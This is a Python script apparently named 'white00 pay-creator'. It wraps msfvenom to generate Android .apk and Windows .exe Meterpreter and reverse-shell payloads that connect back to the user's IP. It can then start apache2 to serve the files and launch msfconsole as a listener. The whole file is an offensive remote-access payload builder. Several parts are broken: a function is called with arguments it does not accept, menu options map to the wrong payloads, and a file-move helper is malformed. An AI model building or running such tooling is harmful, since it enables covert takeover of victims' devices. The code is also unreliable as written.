
import os
import pyfiglet as pf
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

print(Fore.RED+Style.BRIGHT+Style.BRIGHT+pf.figlet_format("white00 pay-creator"))
print(Fore.YELLOW+Back.BLACK+Style.BRIGHT+"created by : santhosh.s ")

print(Fore.GREEN+Back.BLACK+"[USE THIS TOOL HAS ROOT USER]\n\n")

# android payload creating function


def pay1(lhost1, lport1, file_name1):
    print(Fore.BLUE+Style.BRIGHT+"Creating payload..")
    os.system(f'msfvenom -p android/meterpreter/reverse_http LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay2(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/meterpreter/reverse_https LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay3(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost1}" LPORT="{lport1}" R> {file_name1}')

    print("generated the payload...\n")


def pay4(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/meterpreter_reverse_http LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay5(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/meterpreter_reverse_https LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay6(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/meterpreter_reverse_tcp LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay7(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/shell/reverse_http LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay8(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/shell/reverse_https LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")


def pay9(lhost1, lport1, file_name1):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p android/shell/reverse_tcp LHOST={lhost1} LPORT={lport1} R> {file_name1}')

    print("generated the payload...\n")

# metasploit function


def msf():
    print(Fore.GREEN+Back.BLACK+Style.BRIGHT+"starting metasploit framework ++++")
    os.system("msfconsole")

# apache2 starting function


def apache_ser():
    print(Fore.GREEN+Back.BLACK+Style.BRIGHT+"starting apache2 server...\n")
    os.system("service apache2 start")

    print(Fore.GREEN+Back.BLACK+Style.BRIGHT+"started the apache2 server")


def mv_file():
    print(Fore.GREEN+Back.BLACK+Style.BRIGHT+"moving the file ..")
    os.system("mv"+file_name+" /var/www/html")
    print(str("moved the file to /var/www/html directory"))


# win payload function


def win1(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/meterpreter/bind_tcp LHOST={lhost} LPORT={lport} R> {file_name}')


def win2(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/meterpreter/reverse_http  LHOST={lhost} LPORT={lport} R> {file_name}')


def win3(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/meterpreter/reverse_https  LHOST={lhost} LPORT={lport} R> {file_name}')


def win4(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/meterpreter_reverse_http LHOST={lhost} LPORT={lport} R> {file_name}')


def win5(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/meterpreter_reverse_https LHOST={lhost} LPORT={lport} R> {file_name}')


def win6(lhost, lport, file_name):
    os.system(f'msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} R> {file_name}')


def win7(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/powershell_bind_tcp LHOST={lhost} LPORT={lport} R> {file_name}')


def win8(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/powershell_reverse_tcp LHOST={lhost} LPORT={lport} R> {file_name}')


def win9(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/shell/reverse_tcp  LHOST={lhost} LPORT={lport} R> {file_name}')


def win10(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter/bind_tcp   LHOST={lhost} LPORT={lport} R> {file_name}')


def win11(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter/bind_http  LHOST={lhost} LPORT={lport} R> {file_name}')


def win12(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter/bind_https  LHOST={lhost} LPORT={lport} R> {file_name}')


def win13(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={lhost} LPORT={lport} R> {file_name}')


def win14(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={lhost} LPORT={lport} R> {file_name}')


def win15():
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter_reverse_http  LHOST={lhost} LPORT={lport} R> {file_name}')


def win16(lhost, lport, file_name):
    print(Fore.BLUE + Style.BRIGHT + "Creating payload..")
    os.system(f'msfvenom -p windows/x64/meterpreter_reverse_https  LHOST={lhost} LPORT={lport} R> {file_name}')


andro_win = input(Fore.RED+Style.BRIGHT+"Choose the type of payload (android/windows): ")


if andro_win.lower() == "android":
    print(Fore.GREEN+Back.BLACK+"""1.android/meterpreter/reverse_http                  
2.android/meterpreter/reverse_https                  
3.android/meterpreter/reverse_tcp                     
4.android/meterpreter_reverse_http                    
5.android/meterpreter_reverse_https                   
6.android/meterpreter_reverse_tcp                     
7.android/shell/reverse_http                          
8.android/shell/reverse_https                         
9.android/shell/reverse_tcp \n """)

    choose_pay = (input(Fore.RED+Style.BRIGHT+"Enter the payload number {1,2,3,4,5,6,7,8,9}:  "))

    lhost1 = (input(Fore.RED+Style.BRIGHT+"Enter your ip address:  "))

    lport1 = (input(Fore.RED+Style.BRIGHT+"Enter a port number : "))

    file_name1 = input(Fore.RED+Style.BRIGHT+"Enter a name for your payload with extension(.apk): ")

    # payload execute funtion
    if choose_pay == "1":
        pay1(lhost1, lport1, file_name1)

    if choose_pay == "2":
        pay2(lhost1, lport1, file_name1)

    if choose_pay == "3":
        pay3(lhost1, lport1, file_name1)

    if choose_pay == "4":
        pay4(lhost1, lport1, file_name1)

    if choose_pay == "5":
        pay2(lhost1, lport1, file_name1)

    if choose_pay == "6":
        pay6(lhost1, lport1, file_name1)

    if choose_pay == "7":
        pay7(lhost1, lport1, file_name1)

    if choose_pay == "8":
        pay8(lhost1, lport1, file_name1)

    if choose_pay == "9":
        pay9(lhost1, lport1, file_name1)

    apa_ser1 = input(Fore.YELLOW+Style.BRIGHT+"Do you want to start apache2 service (y/n): ")

    if apa_ser1 == "y":
        apache_ser()

    msf_lis1 = input(Fore.YELLOW+Style.BRIGHT+"Do you want to start metasploit framework (y/n): ")

    if msf_lis1 == "y":
        msf()

    else:
        print(Fore.BLUE+Style.BRIGHT+"QUITTING :)")
        quit()


if andro_win.lower() == "windows":
    print(Fore.GREEN+"""1.windows/meterpreter/bind_tcp
2.windows/meterpreter/reverse_http 
3.windows/meterpreter/reverse_https
4.windows/meterpreter_reverse_http 
5.windows/meterpreter_reverse_https
6.windows/meterpreter_reverse_tcp 
7.windows/powershell_bind_tcp                         
8.windows/powershell_reverse_tcp 
9.windows/shell/reverse_tcp
10.windows/x64/meterpreter/bind_tcp 
11.windows/x64/meterpreter/reverse_http
12.windows/x64/meterpreter/reverse_https
13.windows/x64/meterpreter/reverse_tcp
14.windows/x64/shell/bind_tcp                                                                          
15.windows/x64/meterpreter_reverse_http                
16.windows/x64/meterpreter_reverse_https\n""")

    choose_pay1 = input(Fore.BLUE+Style.BRIGHT+"Enter the payload number {1,2,3,4,5,6,7,8,9,,10,11,12,13,14,15,16}:")

# input required things for creating a payload

    lhost = (input(Fore.BLUE+Style.BRIGHT+"Enter your ip address:  "))

    lport = (input(Fore.BLUE+Style.BRIGHT+"Enter a port number : "))

    file_name = input(Fore.BLUE+Style.BRIGHT+"Enter a name for your payload with extension(.exe): ")

    # windows payload execution

    if choose_pay1 == "1":
        win1(lhost, lport, file_name)

    if choose_pay1 == "2":
        win2(lhost, lport, file_name)

    if choose_pay1 == "3":
        win3(lhost, lport, file_name)

    if choose_pay1 == "4":
        win4(lhost, lport,file_name)

    if choose_pay1 == "5":
        win5(lhost, lport, file_name)

    if choose_pay1 == "6":
        win6(lhost, lport, file_name)

    if choose_pay1 == "7":
        win7(lhost, lport, file_name)

    if choose_pay1 == "8":
        win8(lhost, lport, file_name)

    if choose_pay1 == "9":
        win9(lhost, lport, file_name)

    if choose_pay1 == "10":
        win10(lhost, lport, file_name)

    if choose_pay1 == "11":
        win11(lhost, lport, file_name)

    if choose_pay1 == "12":
        win12(lhost, lport, file_name)

    if choose_pay1 == "13":
        win13(lhost, lport, file_name)

    if choose_pay1 == "14":
        win14(lhost, lport, file_name)

    if choose_pay1 == "15":
        win15(lhost, lport, file_name)

    if choose_pay1 == "16":
        win16(lhost, lport, file_name)

    apa_ser = input(Fore.RED+Style.BRIGHT+"Do you want to start apache2 service (y/n): ")

    if apa_ser == "y":
        apache_ser()

    msf_lis = input(Fore.RED+Style.BRIGHT+"Do you want to start metasploit framework (y/n): ")

    if msf_lis == "y":
        msf()

    else:
        print(Fore.GREEN+Back.BLACK+Style.BRIGHT+"QUITTING :(")
        quit()










